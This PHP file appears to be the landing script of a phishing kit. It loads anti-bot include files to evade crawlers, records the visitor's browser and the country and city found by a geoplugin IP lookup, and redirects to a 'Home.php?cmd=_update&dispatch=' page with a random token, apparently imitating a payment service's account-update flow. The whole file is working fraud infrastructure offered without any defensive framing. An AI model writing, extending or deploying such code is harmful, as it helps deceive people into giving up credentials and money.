<?php 
@ini_set('display_errors', 0); 
error_reporting(E_ALL ^ E_NOTICE); 
include('sayron.php'); 
include 'antibots.php';
include 'bots.php';
session_start();
?>
<?php
$date = date ("Y-n-d");
$time = date ("H:i:s");
$random = rand(0,100000000000);
$dis    = substr(md5($random), 0, 17);
session_start();
include("img/browser.php");
$bro = getBrowser();
$getbro = $bro["name"]." ".$bro["version"]." on ".$bro["platform"];
$_SESSION["bro"] = $getbro;
/// COUNTRY
$PP = getenv("REMOTE_ADDR");
$J7 = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=$PP");
$COUNTRY = $J7->geoplugin_countryName ; // Country
$countryforip = "$COUNTRY"; 
$_SESSION["COUNTRY"] = "$countryforip";
$COUNTRYCODE = $J7->geoplugin_countryCode ; // Country Code;
$city = $J7->geoplugin_city ; // city;

$x=md5(microtime());$xx=sha1(microtime());
header("location:Home.php?cmd=_update&dispatch=$dis&locale=en_$COUNTRYCODE");

?> 